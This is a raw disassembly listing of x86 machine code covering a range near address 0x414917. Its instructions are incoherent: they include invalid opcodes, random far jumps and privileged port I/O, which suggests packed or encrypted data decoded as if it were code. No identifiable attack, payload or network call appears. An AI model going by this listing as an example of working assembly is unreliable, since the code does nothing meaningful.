  414917:	mov    ebp,0xb9d5854e
  41491c:	daa    
  41491d:	xchg   edi,eax
  41491e:	pop    ebp
  41491f:	pop    ds
  414920:	jg     0x414928
  414922:	adc    eax,0xe93ff57a
  414927:	fisub  WORD PTR [edx]
  414929:	and    al,bl
  41492b:	pop    edi
  41492c:	and    BYTE PTR fs:[ebp+0x350b74ba],bl
  414933:	popf   
  414934:	mov    ebx,0x7156bb36
  414939:	jne    0x41497d
  41493b:	test   DWORD PTR [edx],ebx
  41493d:	(bad)  [esi-0x70]
  414940:	inc    ecx
  414941:	and    al,0xf9
  414943:	inc    ebx
  414944:	xchg   edi,eax
  414945:	and    eax,0xd683f5bd
  41494a:	and    al,0x50
  41494c:	jno    0x4148f0
  41494e:	cli    
  41494f:	inc    edx
  414950:	dec    edi
  414951:	rol    DWORD PTR [edx+ecx*8-0x134d8f6],cl
  414958:	leave  
  414959:	cmp    BYTE PTR [esi+0x5c57b65],al
  41495f:	mov    bl,0x71
  414961:	jnp    0x4148fd
  414963:	fistp  DWORD PTR [eax+edi*8-0x19e03502]
  41496b:	or     BYTE PTR ds:0xf1e8ef42,dh
  414971:	pop    esi
  414972:	dec    esi
  414973:	push   es
  414974:	jno    0x4149c8
  414976:	xor    bh,dh
  414978:	lea    edx,[esi-0x10]
  41497b:	adc    ah,dh
  41497d:	xchg   ecx,eax
  41497e:	jnp    0x414914
  414980:	cmp    DWORD PTR [edi],ecx
  414982:	pop    es
  414983:	push   edx
  414984:	loope  0x414974
  414986:	and    ah,BYTE PTR [ecx+0x50cf2871]
  41498c:	xor    eax,DWORD PTR [ecx+0x72bb9e01]
  414992:	aad    0x93
  414994:	xchg   esi,eax
  414995:	sbb    edx,DWORD PTR [ecx-0xfe05b7e]
  41499b:	sbb    BYTE PTR [ebx],dl
  41499d:	addr16 add edi,ebx
  4149a0:	mov    ds:0xc6cfd537,eax
  4149a5:	xlat   BYTE PTR ds:[ebx]
  4149a6:	push   ebx
  4149a7:	cmp    ah,BYTE PTR [ebp-0x52]
  4149aa:	mov    BYTE PTR [ebp+0x6d],dh
  4149ad:	test   dl,dh
  4149af:	(bad)
  4149b2:	jmp    0x29a8:0x79e771a5
  4149b9:	loope  0x41496a
  4149bb:	push   0xef142066
  4149c0:	fist   WORD PTR [ecx+edx*8+0xc]
  4149c4:	push   0xffffffe7
  4149c6:	aad    0xe7
  4149c8:	xchg   ecx,eax
  4149c9:	enter  0x9938,0x9a
  4149cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ce:	sbb    BYTE PTR [ebp-0x60],dh
  4149d1:	push   edx
  4149d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d3:	lea    eax,[edx]
  4149d5:	cld    
  4149d6:	scas   al,BYTE PTR es:[edi]
  4149d7:	sbb    BYTE PTR [ecx-0x3c],dh
  4149da:	inc    esi
  4149db:	push   edx
  4149dc:	retf   
  4149dd:	int    0x67
  4149df:	fsubr  QWORD PTR [esi]
  4149e1:	pop    ebp
  4149e2:	push   ss
  4149e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e4:	jno    0x4149db
  4149e6:	in     eax,0xef
  4149e8:	push   ds
  4149e9:	push   esp
  4149ea:	lea    edi,[ecx+esi*2-0x22]
  4149ee:	mov    bh,0x0
  4149f0:	sbb    dl,0xc9
  4149f3:	rol    BYTE PTR [esi+0x3624671f],0xc7
  4149fa:	scas   eax,DWORD PTR es:[edi]
  4149fb:	pop    ebp
  4149fc:	clc    
  4149fd:	sahf   
  4149fe:	mov    edi,0x6eeb72d6
  414a03:	jnp    0x414a41
  414a05:	xor    ch,bl
  414a07:	addr16 rcr eax,1
  414a0a:	mov    WORD PTR [ebp-0x7a],?
  414a0d:	jl     0x414a81
  414a0f:	jo     0x4149f1
  414a11:	bnd ja 0x414a82
  414a14:	jno    0x414a94
  414a16:	pop    ecx
  414a17:	scas   eax,DWORD PTR es:[edi]
  414a18:	ds xchg ebx,eax
  414a1a:	add    DWORD PTR [esi],esp
  414a1c:	in     al,dx
  414a1d:	pop    ds
  414a1e:	rcl    edi,1
  414a20:	pusha  
  414a21:	inc    edx
  414a22:	dec    esp
  414a23:	(bad)  
  414a24:	outs   dx,DWORD PTR ds:[esi]
  414a25:	or     al,0xec
  414a27:	xchg   edx,eax
  414a28:	mov    dh,0xa5
  414a2a:	aad    0x22
  414a2c:	xor    BYTE PTR [edx+0x1fd9bce0],dl
  414a32:	sbb    edx,DWORD PTR [eax+edi*2+0xf2a0e06]
  414a39:	add    bl,cl
  414a3b:	xor    BYTE PTR [edi+0x4b],0x97
  414a3f:	js     0x4149ee
  414a41:	pop    es
  414a42:	mov    bl,0x14
  414a44:	pop    ss
  414a45:	and    bl,dl
  414a47:	pop    ebx
  414a48:	stc    
  414a49:	jne    0x414a86
  414a4b:	pop    ebp
  414a4c:	pop    esp
  414a4d:	adc    ebp,0x59c89b6e
  414a53:	cwde   
  414a54:	(bad)  
  414a55:	sbb    al,BYTE PTR [ecx+0x5bf46f78]
  414a5b:	mov    edx,0x7f8dd80f
  414a60:	sahf   
  414a61:	sub    bl,0x3c
  414a64:	push   ebp
  414a65:	or     esi,edx
  414a67:	mov    esp,0xd6efcd87
  414a6c:	pop    ebx
  414a6d:	call   0x4adb:0x12a785d
  414a74:	daa    
  414a75:	sub    al,0x5d
  414a77:	cmp    eax,0x19c5dbba
  414a7c:	jg     0x414ad3
  414a7e:	iret   
  414a7f:	inc    edx
  414a80:	sbb    al,BYTE PTR [eax]
  414a82:	and    al,BYTE PTR [edi+0x7f8edcd6]
  414a88:	in     al,dx
  414a89:	mov    ds:0x3d0528e3,al
  414a8e:	add    esi,ebp
  414a90:	ja     0x414ae6
  414a92:	daa    
  414a93:	sahf   
  414a94:	pop    ss
  414a95:	out    0xf3,al
  414a97:	test   BYTE PTR [ecx-0x5],al
  414a9a:	aad    0xb0
  414a9c:	sar    DWORD PTR [eax+0x6c],0x48
  414aa0:	ret    0x4a2e
  414aa3:	jle    0x414a9b
  414aa5:	xchg   ch,dl
  414aa7:	add    al,BYTE PTR [ebx+0x729fa57a]
  414aad:	adc    dh,dh
  414aaf:	xor    DWORD PTR [eax],ebx
  414ab1:	lds    esp,FWORD PTR [edi-0x4c]
  414ab4:	inc    ecx
  414ab5:	repnz pop ds
  414ab7:	jbe    0x414a90
  414ab9:	int    0xc4
  414abb:	adc    ch,BYTE PTR [ebp+0x7b]
  414abe:	lods   al,BYTE PTR ds:[esi]
  414abf:	in     eax,0xfb
  414ac1:	and    ch,dl
  414ac3:	cmp    esp,edi
  414ac5:	jecxz  0x414a99
  414ac7:	dec    ebp
  414ac8:	mov    ds:0x32755673,eax
  414acd:	pop    eax
  414ace:	test   DWORD PTR [ebp+0x2e37b89b],esi
  414ad4:	je     0x414b01
  414ad6:	fisttp QWORD PTR [edx+eiz*2+0x176676d]
  414add:	cld    
  414ade:	rcr    DWORD PTR [esi+0x4143c44e],0xba
  414ae5:	cmp    edx,DWORD PTR [ebx]
  414ae7:	jae    0x414af5
  414ae9:	and    BYTE PTR [esi-0x80],ah
  414aec:	inc    esi
  414aed:	add    eax,0x26c1f49b
  414af2:	pop    esp
  414af3:	xor    eax,0x652ec4de
  414af8:	mov    BYTE PTR [edi+ebp*2+0x37],cl
  414afc:	jge    0x414b0f
  414afe:	mov    ah,0x68
  414b00:	addr16 cs data16 jne 0x414b60
  414b05:	stos   DWORD PTR es:[edi],eax
  414b06:	xor    BYTE PTR [edx+0x1d],al
  414b09:	sub    BYTE PTR [eax-0x3a518e77],0x28
  414b10:	shl    BYTE PTR [esi],0x9b
  414b13:	mov    ecx,0x74f1911c
  414b18:	mov    ecx,0x76606be3
  414b1d:	popf   
  414b1e:	push   ebp
  414b1f:	hlt    
  414b20:	jno    0x414b74
  414b22:	cld    
  414b23:	pop    eax
  414b24:	mov    ss,WORD PTR [esi]
  414b26:	loop   0x414b8c
  414b28:	mov    bl,BYTE PTR [ebx+0x74]
  414b2b:	xor    BYTE PTR [ecx+0x29],0xdd
  414b2f:	gs adc ch,BYTE PTR ds:[ecx]
  414b33:	imul   esi,DWORD PTR [ecx-0x57],0x6b
  414b37:	mov    esp,edx
  414b39:	lds    ecx,FWORD PTR [eax]
  414b3b:	mov    ebx,0xe3d02003
  414b40:	fisub  WORD PTR [ecx-0x60]
  414b43:	lods   al,BYTE PTR ds:[esi]
  414b44:	jge    0x414b9d
  414b46:	ret    
  414b47:	aad    0x72
  414b49:	or     eax,0x7ab97f67
  414b4e:	leave  
  414b4f:	mov    BYTE PTR [ebp+0x53],al
  414b52:	dec    ebx
  414b53:	jne    0x414b8e
  414b55:	daa    
  414b56:	pop    ecx
  414b57:	(bad)  
  414b58:	xor    eax,0x7bdf1599
  414b5d:	loop   0x414bb4
  414b5f:	jae    0x414b94
  414b61:	mov    ebx,0x2a5ffc14
  414b66:	stc    
  414b67:	retf   
  414b68:	mov    eax,0x8c4325c0
  414b6d:	inc    edi
  414b6e:	daa    
  414b6f:	jl     0x414bcd
  414b71:	mov    eax,ds:0xafd6fcc6
  414b76:	push   ds
  414b77:	xor    bl,dh
  414b79:	sbb    dl,dh
  414b7b:	inc    ecx
  414b7c:	push   es
  414b7d:	or     BYTE PTR [edx+0x36],dh
  414b80:	jns    0x414b96
  414b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b83:	jne    0x414b36
  414b85:	xchg   ecx,eax
  414b86:	jmp    0x414bb3
  414b88:	aam    0xb1
  414b8a:	sti    
  414b8b:	arpl   WORD PTR [ecx-0x71],si
  414b8e:	push   0xffffffba
  414b90:	dec    BYTE PTR [edx]
  414b92:	rcl    al,0xae
  414b95:	pop    ds
  414b96:	jnp    0x414bb1
  414b98:	test   BYTE PTR [esi-0x37],bh
  414b9b:	stos   BYTE PTR es:[edi],al
  414b9c:	retf   0xd542
  414b9f:	inc    ebx
  414ba0:	and    eax,0x366231e0
  414ba5:	jbe    0x414b96
  414ba7:	jnp    0x414be8
  414ba9:	push   0x3
  414bab:	adc    al,0x75
  414bad:	iret   
  414bae:	sahf   
  414baf:	outs   dx,BYTE PTR ds:[esi]
  414bb0:	in     al,0xf6
  414bb2:	aad    0x60
  414bb4:	add    eax,0x95893050
  414bb9:	jecxz  0x414ba7
  414bbb:	jbe    0x414b40
  414bbd:	mov    bh,0xd4
  414bbf:	clc    
  414bc0:	fldcw  WORD PTR [ebp+esi*1-0x2ad7a3ea]
  414bc7:	mov    cl,BYTE PTR [edx]
  414bc9:	add    bl,BYTE PTR [edi+0x2cc0be86]
  414bcf:	jne    0x414bb9
  414bd1:	mov    esi,DWORD PTR [ebx]
  414bd3:	cmp    edx,DWORD PTR [esi]
  414bd5:	in     eax,0xcf
  414bd7:	out    0x74,al
  414bd9:	ss inc ebp
  414bdb:	jle    0x414b87
  414bdd:	mov    eax,0x7601560d
  414be2:	push   DWORD PTR [eax+edx*4]
  414be5:	add    esi,DWORD PTR [ebx]
  414be7:	jno    0x414c5a
  414be9:	jno    0x414c49
  414beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bec:	sub    ah,dh
  414bee:	mov    ds:0xf31f844f,al
  414bf3:	call   0x2f2c6c81
  414bf8:	or     cl,dl
  414bfa:	push   esp
  414bfb:	jmp    0x34d5:0x72283671
  414c02:	inc    eax
  414c03:	mov    bl,0x2c
  414c05:	and    BYTE PTR [edx+0x4b63bedd],dl
  414c0b:	cmc    
  414c0c:	sbb    ebx,DWORD PTR [edi-0x2b]
  414c0f:	jb     0x414b94
  414c11:	inc    eax
  414c12:	jbe    0x414c73
  414c14:	out    0x55,al
  414c16:	sub    DWORD PTR [esi-0x6b],esi
  414c19:	sbb    al,0x53
  414c1b:	sbb    dh,dl
  414c1d:	ja     0x414bff
  414c1f:	cmp    al,0x25
  414c21:	xchg   ebp,edx
  414c23:	dec    ecx
  414c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c25:	mov    ebp,0x83093344
  414c2a:	mov    esi,0xfc8a5075
  414c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c30:	imul   ecx,DWORD PTR [eax-0x5d1496d1],0x4d
  414c37:	xchg   edx,eax
  414c38:	js     0x414bdb
  414c3a:	dec    eax
  414c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c3c:	outs   dx,DWORD PTR ds:[esi]
  414c3d:	ds aad 0x76
  414c40:	ror    DWORD PTR [ebx-0x50],0x63
  414c44:	jne    0x414c65
  414c46:	dec    edx
  414c47:	lahf   
  414c48:	retf   0x40b4
  414c4b:	dec    edx
  414c4c:	and    al,0xa4
  414c4e:	aad    0xec
  414c50:	mov    ebp,0xe2ff8718
  414c55:	dec    esp
  414c56:	lds    edx,FWORD PTR [ebx-0x18c7da3]
  414c5c:	arpl   bx,ax
  414c5e:	push   ebp
  414c5f:	lods   eax,DWORD PTR ds:[esi]
  414c60:	std    
  414c61:	test   eax,ecx
  414c63:	repz lea ebx,[esi-0x40]
  414c67:	or     ecx,esi
  414c69:	mov    esi,0x89ab4ccc
  414c6e:	scas   eax,DWORD PTR es:[edi]
  414c6f:	jmp    0x44b16c3d
  414c74:	push   edi
  414c75:	xor    bl,ch
  414c77:	jne    0x414c1d
  414c79:	dec    eax
  414c7a:	dec    esi
  414c7b:	mov    al,ds:0x37cef471
  414c80:	jmp    0x8d20:0x3521f96f
  414c87:	(bad)
  414c8b:	jmp    0xfc17d877
  414c90:	sahf   
  414c91:	sub    esp,ebp
  414c93:	push   eax
  414c94:	sbb    al,0x95
  414c96:	rol    DWORD PTR [edx+0x2f192ed2],1
  414c9c:	xchg   ecx,eax
  414c9d:	shl    DWORD PTR [eax+eiz*2-0x6f],1
  414ca1:	cmc    
  414ca2:	xchg   edi,eax
  414ca3:	pushf  
  414ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca5:	test   ah,ah
  414ca7:	ror    DWORD PTR [ebx+0x51],0xef
  414cab:	mov    ah,0xcc
  414cad:	mov    ch,0xb
  414caf:	or     eax,0x47a51fc3
  414cb4:	mov    ch,0x12
  414cb6:	aam    0x8e
  414cb8:	repz imul edx,DWORD PTR [edx+0x48],0xec425a71
  414cc0:	cld    
  414cc1:	push   es
  414cc2:	cmp    BYTE PTR [esi+0xb],cl
  414cc5:	ds mov esi,0x796d8f7e
  414ccb:	adc    al,0x52
  414ccd:	retf   0x5350
  414cd0:	scas   eax,DWORD PTR es:[edi]
  414cd1:	out    0x62,eax
  414cd3:	push   edx
  414cd4:	jno    0x414ccb
  414cd6:	push   ebp
  414cd7:	in     eax,dx
  414cd8:	(bad)  
  414cd9:	pop    ss
  414cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cdb:	sub    DWORD PTR [eax],eax
  414cdd:	add    cl,BYTE PTR [ebx]
  414cdf:	jns    0x414d50
  414ce1:	imul   esi,DWORD PTR [ebp+0x7a],0xfffffffa
  414ce5:	fist   WORD PTR [ecx]
  414ce7:	mov    ah,0x5f
  414ce9:	add    dh,dl
  414ceb:	ds (bad) 
  414ced:	mov    ah,0xc0
  414cef:	push   esp
  414cf0:	or     eax,0x5575543d
  414cf5:	cli    
  414cf6:	bound  esi,QWORD PTR [esi+ebx*4+0x6c]
  414cfa:	dec    eax
  414cfb:	or     al,0x71
  414cfd:	bound  ecx,QWORD PTR [edx+0x40]
  414d00:	pusha  
  414d01:	loop   0x414cf7
  414d03:	mov    ch,bh
  414d05:	pop    ds
  414d06:	mov    ah,BYTE PTR [ecx-0x4d69653f]
  414d0c:	out    dx,al
  414d0d:	cld    
  414d0e:	aad    0xad
  414d10:	push   eax
  414d11:	sbb    bl,BYTE PTR [eax+0x60]
  414d14:	and    eax,0x8b7305e3
  414d19:	pop    ds
  414d1a:	jb     0x414d1f
  414d1c:	mov    esi,0x85ab174
  414d21:	fsub   st,st(0)
  414d23:	cdq    
  414d24:	and    BYTE PTR [edx+0x232ded4a],ch
  414d2a:	in     eax,0x7a
  414d2c:	scas   eax,DWORD PTR es:[edi]
  414d2d:	fwait
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ds:0x969acb19,al
  414d34:	jno    0x414d79
  414d36:	push   0x47585d50
  414d3b:	cld    
  414d3c:	xchg   edi,eax
  414d3d:	pop    ds
  414d3e:	int3   
  414d3f:	jb     0x414cd4
  414d41:	dec    eax
  414d42:	lea    eax,[ebp-0x28]
  414d45:	mov    DWORD PTR [ecx],0xf5d7ccc9
  414d4b:	or     dh,BYTE PTR [ecx-0x6e]
  414d4e:	mov    edi,0xf7c412bf
  414d53:	cld    
  414d54:	mov    DWORD PTR [edx],esp
  414d56:	xor    DWORD PTR [eax],esi
  414d58:	xchg   edx,eax
  414d59:	fsub   DWORD PTR [edx+eiz*1+0x3ed6eb74]
  414d60:	pop    edx
  414d61:	xor    cl,BYTE PTR [ebx+0x1990103d]
  414d67:	add    eax,0x24601ffb
  414d6c:	and    eax,0x4a2a3b8
  414d71:	adc    esi,0xffffff86
  414d74:	pop    ecx
  414d75:	push   ds
  414d76:	neg    BYTE PTR [ebx]
  414d78:	inc    ebp
  414d79:	repz ror DWORD PTR [esi+0x759597ff],0xbc
  414d81:	ret    
  414d82:	rcl    DWORD PTR [ecx-0x32],1
  414d85:	jbe    0x414d9e
  414d87:	pop    esi
  414d88:	jno    0x414da6
  414d8a:	inc    BYTE PTR [eax+0x50b5e512]
  414d90:	lock pop ds
  414d92:	pop    esp
  414d93:	les    ebx,FWORD PTR [edx*1+0x1a8dab2b]
  414d9a:	(bad)  
  414d9b:	faddp  st(5),st
  414d9d:	fnstcw WORD PTR [edx]
  414d9f:	inc    eax
  414da0:	pop    esp
  414da1:	push   es
  414da2:	xor    DWORD PTR [ebp+0x56],esi
  414da5:	mov    esi,DWORD PTR [edx]
  414da7:	jg     0x414d95
  414da9:	mov    bl,0xad
  414dab:	fnstenv [ecx+0xf]
  414dae:	push   ebx
  414daf:	add    eax,0xd49580a4
  414db4:	add    BYTE PTR [eax],ah
  414db6:	fldenv [ecx]
  414db8:	sbb    esp,DWORD PTR [ebx]
  414dba:	push   es
  414dbb:	push   ebx
  414dbc:	sbb    cl,BYTE PTR [esi-0x2b]
  414dbf:	mov    BYTE PTR [ebx],bh
  414dc1:	ror    DWORD PTR ds:0x420e064a,0x92
  414dc8:	fwait
  414dc9:	jg     0x414db3
  414dcb:	mov    ah,0x9
  414dcd:	jle    0x414dd5
  414dcf:	xchg   DWORD PTR [esi-0x1caa272e],eax
  414dd5:	jbe    0x414d5e
  414dd7:	in     al,0x3
  414dd9:	adc    BYTE PTR [ecx],al
  414ddb:	xchg   ebp,eax
  414ddc:	mov    eax,0xa2663f1f
  414de1:	int3   
  414de2:	lock jbe 0x414e12
  414de5:	mov    ch,dl
  414de7:	adc    BYTE PTR [edx-0x41],ch
  414dea:	xor    BYTE PTR [ecx+0x23],al
  414ded:	xchg   edi,ecx
  414def:	jbe    0x414de0
  414df1:	push   0x6c
  414df3:	mov    esp,0x9577b9ac
  414df8:	mov    al,0xd6
  414dfa:	aad    0xb2
  414dfc:	pop    ecx
  414dfd:	fbstp  TBYTE PTR [ebx]
  414dff:	out    dx,eax
  414e00:	mov    ebp,ebx
  414e02:	and    dh,BYTE PTR [ebp-0xd]
  414e05:	xor    BYTE PTR [edx+0x1064f26b],al
  414e0b:	add    eax,0x91c75571
  414e10:	adc    al,0xad
  414e12:	cmp    BYTE PTR [edi],cl
  414e14:	mov    edx,0xe020ed1f
  414e19:	stos   BYTE PTR es:[edi],al
  414e1a:	fistp  DWORD PTR [ebx]
  414e1c:	jecxz  0x414db8
  414e1e:	aad    0x2f
  414e20:	ret    
  414e21:	cli    
  414e22:	dec    esi
  414e23:	jp     0x414e8a
  414e25:	arpl   WORD PTR [esi],dx
  414e27:	jne    0x414dd7
  414e29:	lock adc bl,bh
  414e2c:	mov    esi,0x71095fdf
  414e31:	xchg   ebp,eax
  414e32:	sub    DWORD PTR [esi+0x64ae3e93],0xffffff8d
  414e39:	pop    edx
  414e3a:	ret    0x71c5
  414e3d:	popf   
  414e3e:	test   eax,0x695f4207
  414e43:	mov    bh,0x78
  414e45:	nop
  414e46:	out    0xad,al
  414e48:	test   al,0xa8
  414e4a:	mov    esp,0xc7bce141
  414e4f:	loop   0x414de3
  414e51:	pop    ds
  414e52:	repz push es
  414e54:	ret    0xea5a
  414e57:	push   ss
  414e58:	push   edx
  414e59:	dec    edx
  414e5a:	aad    0x26
  414e5c:	dec    eax
  414e5d:	sub    dl,BYTE PTR [ecx+ebp*2-0x73]
  414e61:	out    dx,eax
  414e62:	outs   dx,BYTE PTR ds:[esi]
  414e63:	jne    0x414eba
  414e65:	mov    al,ds:0x640bb250
  414e6a:	inc    edi
  414e6b:	xchg   ebp,eax
  414e6c:	jno    0x414e4c
  414e6e:	inc    eax
  414e6f:	lods   eax,DWORD PTR ds:[esi]
  414e70:	cwde   
  414e71:	sub    bl,ch
  414e73:	xlat   BYTE PTR ds:[ebx]
  414e74:	loopne 0x414e95
  414e76:	adc    ebp,DWORD PTR [ecx-0x5d1c3af3]
  414e7c:	in     eax,0x54
  414e7e:	in     al,0x43
  414e80:	sbb    BYTE PTR [edx+0x21],ah
  414e83:	aad    0x33
  414e85:	ds mov esi,0x3c26dc95
  414e8b:	out    dx,al
  414e8c:	or     ebp,edi
  414e8e:	push   eax
  414e8f:	in     eax,0x9b
  414e91:	jecxz  0x414e33
  414e93:	clc    
  414e94:	or     DWORD PTR [edx+0x61],0x60
  414e98:	jno    0x414f12
  414e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e9b:	cmp    ch,BYTE PTR ds:0x24e60705
  414ea1:	pop    ebx
  414ea2:	add    ch,BYTE PTR [ebx]
  414ea4:	jno    0x414eaf
  414ea6:	and    esp,DWORD PTR [ebx+0x30aed1d1]
  414eac:	jno    0x414eb6
  414eae:	sahf   
  414eaf:	jg     0x414f29
  414eb1:	sbb    al,0x8d
  414eb3:	adc    al,0x52
  414eb5:	and    al,cl
  414eb7:	mov    edi,eax
  414eb9:	add    eax,0x6685bb6e
  414ebe:	aad    0x73
  414ec0:	sar    DWORD PTR [ebp+edx*4+0x24],1
  414ec4:	cmp    eax,0xcc7541c9
  414ec9:	shl    dh,1
  414ecb:	xchg   ebx,eax
  414ecc:	imul   eax,DWORD PTR ds:0x6c71c795,0x33b93efe
  414ed6:	in     eax,0xdf
  414ed8:	adc    ah,BYTE PTR [eax]
  414eda:	jb     0x414ec1
  414edc:	enter  0xfbbf,0x2
  414ee0:	fistp  DWORD PTR [esi+0x6ccdcdd8]
  414ee6:	pop    edx
  414ee7:	sahf   
  414ee8:	(bad)  
  414ee9:	iret   
  414eea:	cld    
  414eeb:	mov    dl,0x9f
  414eed:	xchg   edi,eax
  414eee:	fbstp  TBYTE PTR [edi+0x4d]
  414ef1:	rcl    BYTE PTR [esi+0x77],cl
  414ef4:	jns    0x414e7e
  414ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef7:	pop    edx
  414ef8:	popf   
  414ef9:	aas    
  414efa:	xor    DWORD PTR [esi],esi
  414efc:	jno    0x414f13
  414efe:	mov    edi,DWORD PTR [ecx-0x62214f]
  414f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f05:	pop    ds
  414f06:	push   ds
  414f07:	inc    ecx
  414f08:	jns    0x414ef7
  414f0a:	push   ebp
  414f0b:	cmp    al,0x1b
  414f0d:	add    edx,esi
  414f0f:	pop    eax
  414f10:	add    al,0x3f
  414f12:	push   0xffffffae
  414f14:	je     0x414f57
  414f16:	dec    ecx
  414f17:	scas   eax,DWORD PTR es:[edi]
  414f18:	inc    esi
  414f19:	dec    esp
  414f1a:	push   ebp
  414f1b:	inc    edi
  414f1c:	jmp    0x5204d939
  414f21:	xor    eax,0x1fd91e1d
  414f26:	ins    DWORD PTR es:[edi],dx
  414f27:	cmp    DWORD PTR [ecx-0x76],ebp
  414f2a:	sbb    DWORD PTR [ebx],esp
  414f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f2d:	pushf  
  414f2e:	imul   ecx
  414f30:	push   ss
  414f31:	and    BYTE PTR ds:0x4d6a6277,ch
  414f37:	out    0x4a,al
  414f39:	push   ebp
  414f3a:	xlat   BYTE PTR ds:[ebx]
  414f3b:	add    BYTE PTR [ecx-0x44],al
  414f3e:	push   eax
  414f3f:	sbb    BYTE PTR [edi-0x5a],bh
  414f42:	pop    eax
  414f43:	mov    esp,0x944779d1
  414f48:	and    DWORD PTR [esp+edx*1],edx
  414f4b:	jne    0x414eef
  414f4d:	sub    DWORD PTR [edi-0x356f28b8],ebx
  414f53:	cmc    
  414f54:	cmp    ah,bh
  414f56:	call   0x8693:0x416141a4
  414f5d:	pop    eax
  414f5e:	leave  
  414f5f:	sub    dh,BYTE PTR [ecx+ebp*2+0x62]
  414f63:	add    BYTE PTR [esi-0x4c],0xa5
  414f67:	gs jmp 0x414eff
  414f6a:	aad    0x44
  414f6c:	shl    DWORD PTR [ebx+0x5e],1
  414f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f70:	jmp    0x5604:0xb1aead2d
  414f77:	mov    cl,0x98
  414f79:	pop    ss
  414f7a:	popf   
  414f7b:	or     DWORD PTR [edi+0x5f],ecx
  414f7e:	aad    0xb8
  414f80:	cld    
  414f81:	int    0xd0
  414f83:	test   dh,dl
  414f85:	lea    ebx,[ecx+0x75]
  414f88:	(bad)  
  414f89:	shl    eax,1
  414f8b:	out    dx,al
  414f8c:	cvtps2pi mm4,QWORD PTR [edi+0x4e427164]
  414f93:	dec    edx
  414f94:	mov    eax,0x2bb9e9f9
  414f99:	and    esp,DWORD PTR [edx]
  414f9b:	xchg   ebp,eax
  414f9c:	sbb    al,0x53
  414f9e:	and    eax,0x55bef3a4
  414fa3:	cmp    eax,0x23aa1582
  414fa8:	jno    0x415015
  414faa:	dec    esp
  414fab:	xor    al,0xb0
  414fad:	test   al,0x7e
  414faf:	out    dx,al
  414fb0:	rol    BYTE PTR ds:0x3df674d8,cl
  414fb6:	mov    esp,DWORD PTR [edx-0x40]
  414fb9:	inc    ecx
  414fba:	out    0xf6,al
  414fbc:	je     0x41501e
  414fbe:	inc    ebx
  414fbf:	je     0x41500e
  414fc1:	mov    ebp,0x6ad83d90
  414fc6:	hlt    
  414fc7:	je     0x414fd5
  414fc9:	jo     0x414fd7
  414fcb:	stos   BYTE PTR es:[edi],al
  414fcc:	lahf   
  414fcd:	pop    ebx
  414fce:	cmp    cl,dh
  414fd0:	jno    0x414f98
  414fd2:	jnp    0x414f5a
  414fd4:	pop    esi
  414fd5:	xor    ah,BYTE PTR [edx+0x6e1fe746]
  414fdb:	enter  0x504e,0xe0
  414fdf:	push   edi
  414fe0:	sub    eax,DWORD PTR [ebx-0x2b]
  414fe3:	pop    ds
  414fe4:	add    al,0xc3
  414fe6:	(bad)  
  414fe7:	dec    esp
  414fe8:	mov    esp,0x5c7549a1
  414fed:	test   eax,0x1473d7a6
  414ff2:	inc    esp
  414ff3:	outs   dx,DWORD PTR ds:[esi]
  414ff4:	push   ebx
  414ff5:	inc    esi
  414ff6:	aad    0x70
  414ff8:	adc    al,0x74
  414ffa:	mov    al,ds:0x96b645c0
  414fff:	mov    al,gs:0xf0608f6b
  415005:	pop    ds
  415006:	je     0x415012
  415008:	scas   eax,DWORD PTR es:[edi]
  415009:	add    edi,DWORD PTR [ebp-0x50]
  41500c:	popf   
  41500d:	pop    es
  41500e:	cli    
  41500f:	lods   eax,DWORD PTR ds:[esi]
  415010:	mov    ebp,0x3304d53b
  415015:	lahf   
  415016:	(bad)  
  415018:	call   0xffa8:0x71ba1f5c
  41501f:	outs   dx,DWORD PTR ds:[esi]
  415020:	enter  0x21c2,0x5e
  415024:	pop    edi
  415025:	jmp    0x736749ff
  41502a:	dec    ecx
  41502b:	xchg   esp,eax
  41502c:	jns    0x414fc9
  41502e:	fdiv   DWORD PTR [ebx+edx*8+0x45]
  415032:	jle    0x414fc6
  415034:	jecxz  0x415017
  415036:	outs   dx,DWORD PTR ds:[esi]
  415037:	inc    edi
  415038:	jno    0x414fd6
  41503a:	in     eax,0x20
  41503c:	push   ss
  41503d:	out    0xd9,eax
  41503f:	sub    DWORD PTR [edi],0x5b41af27
  415045:	and    dl,dh
  415047:	aaa    
  415048:	out    0x43,al
  41504a:	lds    eax,FWORD PTR [ebx]
  41504c:	popa   
  41504d:	fldcw  WORD PTR ss:[ecx]
  415050:	ds jne 0x414fe7
  415053:	mov    DWORD PTR [eax-0x1d],esi
  415056:	sbb    ecx,DWORD PTR [ebp-0x735b16b7]
  41505c:	jmp    0x41502b
  41505e:	aad    0x39
  415060:	ins    BYTE PTR es:[edi],dx
  415061:	add    edi,DWORD PTR [edi-0x5c]
  415064:	test   al,0xd1
  415066:	jno    0x4150dd
  415068:	aam    0x98
  41506a:	loope  0x41504b
  41506c:	div    DWORD PTR [ebp+0xa]
  41506f:	sbb    al,0xee
  415071:	dec    ebx
  415072:	aad    0xf1
  415074:	xchg   edi,eax
  415075:	into   
  415076:	mov    cl,0x22
  415078:	(bad)  
  415079:	idiv   BYTE PTR ds:0x28aaa494
  41507f:	xchg   esp,eax
  415080:	sti    
  415081:	pop    edx
  415082:	push   ebp
  415083:	loop   0x41502a
  415085:	(bad)
  415088:	sub    dh,BYTE PTR [esi-0x26]
  41508b:	pop    esp
  41508c:	or     BYTE PTR [ebp-0x278e8817],bh
  415092:	mov    ah,dl
  415094:	enter  0x8791,0x75
  415098:	retf   
  415099:	mov    edi,0xc72fb2b4
  41509e:	into   
